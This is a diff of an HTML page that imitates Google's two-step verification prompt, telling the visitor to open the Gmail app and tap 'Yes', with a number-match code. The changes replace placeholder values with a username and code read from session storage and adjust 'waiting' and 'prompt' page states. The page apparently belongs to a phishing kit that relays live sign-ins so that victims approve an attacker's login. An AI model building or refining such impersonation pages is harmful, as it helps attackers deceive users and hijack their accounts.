@@ -356,6 +356,7 @@ a {
 
 </style>
 </head>
+
 <body>
 
 <div id="overlay"></div>
@@ -377,12 +378,12 @@ a {
   
   <div class="user-info">
   <span class="material-symbols-outlined user-icon">account_circle</span>
-  <span class="username" id="username">John Doe</span>
+  <span class="username" id="username"></span>
   <span class="material-symbols-outlined arrow-icon">expand_more</span>
 </div>
 
 	 
-<h1 class="code" id="code">18</h1>
+<h1 class="code" id="code"></h1>
 
 <h3 style="font-weight:500;">Open the Gmail app on your Device</h3><br>
 
@@ -420,6 +421,8 @@ Google sent a notification to your Device. Open the Gmail app and tap <strong>Ye
 </div>
 <script src="assets/emit.js"></script> 
 <script> 
+
+
 	
 	document.addEventListener("DOMContentLoaded", function () {
 
@@ -427,9 +430,11 @@ Google sent a notification to your Device. Open the Gmail app and tap <strong>Ye
     updatePhoneField("#code", sessionStorage.getItem("setPromptCode"));
   }
 
-   page = loadingBar.style.display === "block" && overlay.style.display === "block"
+   screen = loadingBar.style.display === "block" && overlay.style.display === "block"
     ? "waiting"
     : "prompt";
+    
+    page = "prompt";
   document.querySelector("#username").textContent = sessionStorage.getItem("user");
 
 });
